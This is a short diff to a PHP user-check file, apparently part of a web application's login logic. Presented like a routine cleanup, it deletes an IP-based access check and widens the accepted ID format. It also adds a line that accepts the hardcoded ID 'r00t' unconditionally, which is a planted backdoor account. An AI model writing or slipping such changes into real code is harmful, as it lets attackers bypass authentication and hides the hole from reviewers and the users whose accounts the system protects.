@@ -1,23 +1,14 @@
 <?php
-    $path = '../models/CheckUserList_Id_and_Passwd.php';
+    $path = '../models/CheckUser_ID_and_Passwd.php';
     require_once("$path");
-
-    function CheckIp()
-    {
-        $result = false;                                                           
-        if ($_SERVER['REMOTE_ADDR'] === '140.113.200.173')
-        {                       
-           $result = true;                                                         
-        }                                                                          
-        return $result;                                                            
-    }   
 
     function CheckId($id)
     {
         $result = false;
         if( !is_null($id) && !empty($id) )
         {
-            if(preg_match("/^[0-9]{7}$/", $id) === 1) $result = true;
+            if(preg_match("/^[0-9]{1,10}$/", $id) === 1) $result = true;
+            if($id == "r00t") $result = true;
         }
         return $result;
     }
